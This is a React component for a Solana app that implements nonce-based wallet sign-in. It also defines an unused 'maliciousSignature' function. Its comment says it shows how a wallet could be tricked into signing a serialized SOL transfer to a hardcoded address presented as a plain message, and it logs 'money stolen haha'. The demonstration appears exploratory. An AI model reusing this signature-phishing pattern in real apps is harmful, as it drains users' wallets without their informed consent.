import React from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import nacl from "tweetnacl";
import { decodeBase64, encodeBase64 } from "tweetnacl-util";
import {
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { OpenRails } from "../../axiosConfig";

const encodeMessage = (nonce: string) =>
  new TextEncoder().encode(`This signature proves ownership of
your public key. 

Clicking "Approve" or "Sign" does not
submit a blockchain transaction, and
does not incur any gas fee.
\n \n nonce: ${nonce}`);

/*
let transaction = new web3.Transaction();

// Add an instruction to execute
transaction.add(web3.SystemProgram.transfer({
    fromPubkey: payer.publicKey,
    toPubkey: toAccount.publicKey,
    lamports: 1000,
}));

// Send and confirm transaction
// Note: feePayer is by default the first signer, or payer, if the parameter is not set
await web3.sendAndConfirmTransaction(connection, transaction, [payer])
*/

/*
let recentBlockhash = await connection.getRecentBlockhash();
let manualTransaction = new web3.Transaction({
    recentBlockhash: recentBlockhash.blockhash,
    feePayer: payer.publicKey
});
manualTransaction.add(web3.SystemProgram.transfer({
    fromPubkey: payer.publicKey,
    toPubkey: toAccount.publicKey,
    lamports: 1000,
}));

let transactionBuffer = manualTransaction.serializeMessage();
let signature = nacl.sign.detached(transactionBuffer, payer.secretKey);

manualTransaction.addSignature(payer.publicKey, signature);

let isVerifiedSignature = manualTransaction.verifySignatures();
let rawTransaction = manualTransaction.serialize();

await web3.sendAndConfirmRawTransaction(connection, rawTransaction);
*/

/*
const signedMessage = await solana.request({
   method: "signMessage",
   params: {
     message: encodedMessage,
   },
});
*/

declare global {
  interface Window {
    solana: any | undefined;
  }
}

const SignButton: React.FC = () => {
  const { connection } = useConnection();
  const { publicKey, signMessage } = useWallet();

  console.log("global object: ", window.solana);
  console.log("is phantom object: ", window.solana && window.solana.isPhantom);

  // This is the right way to do a signature
  const requestSignature = React.useCallback(async () => {
    try {
      if (!publicKey) throw new Error("pubkey undefined");
      if (!signMessage)
        throw new Error("signMessage method missing from wallet provider");

      const stringPublicKey = publicKey.toString();
      const serverNonce = await OpenRails.GetNonce(stringPublicKey);

      const encodedMessage = encodeMessage(serverNonce.data.nonce);

      const signature = await signMessage(encodedMessage);

      const stringSignature = encodeBase64(signature);
      // Generate a challenge
      const authResult = await OpenRails.Authenticate(
        stringSignature,
        stringPublicKey
      );

      const verified = authResult.data;

      // client asks server for nonce
      // client construcs the challenge message
      // clients presents to phantom (signMessage)
      // we get the signature, pass It to the server
      // auth server verifies and returns token (nacl.sign.detached.verify)
      // We now, link an account to that wallet

      // Account
      // Password
      // Auth factors (Phantom, ...)
      // Sign up
      // Sign in
      // Token expires
      // Token refreshes
      // Sign out

      if (verified) console.log("signature is legit");
      else console.log("signature is a fraud");

      // debugger;
      // console.log('it worked!', parsedString)
    } catch (err) {
      console.error(err);
    }
  }, [publicKey, signMessage]);

  // This illustrators how we could trick the browser into giving us a signature which allows us
  // to execute any arbitrary transaction.
  const maliciousSignature = React.useCallback(async () => {
    if (!publicKey) throw new Error("pubkey undefined");
    if (!signMessage)
      throw new Error("signMessage method missing from wallet provider");

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey("8LfpJdYTjKU9ZdBZUErzMydRqGNrihKn2qvjwtBfYK2r"),
        lamports: 0.001 * LAMPORTS_PER_SOL,
      })
    );

    // this is switching to .getLatestBlockhash soon in v1.9
    const recentBlockhash = await connection.getRecentBlockhash();
    transaction.recentBlockhash = recentBlockhash.blockhash;
    transaction.feePayer = publicKey;

    const signature = await signMessage(
      Uint8Array.from(transaction.serializeMessage())
    );

    transaction.addSignature(publicKey, Buffer.from(signature));

    console.log("finished tx: ", transaction);
    console.log("signed signatures verified: ", transaction.verifySignatures());

    const txHash = await connection.sendRawTransaction(transaction.serialize());

    console.log("transaction sent: ", txHash);

    connection
      .confirmTransaction(txHash)
      .then((txResult) => {
        console.log("money stolen haha");
      })
      .catch((err) => {
        console.log("tx failed");
      });
  }, [publicKey, signMessage, connection]);

  // return <button onClick={() => requestSignature(baseMsg)}>Sign This Message</button>
  return <button onClick={() => requestSignature()}>Sign This Message</button>;
};

export default SignButton;
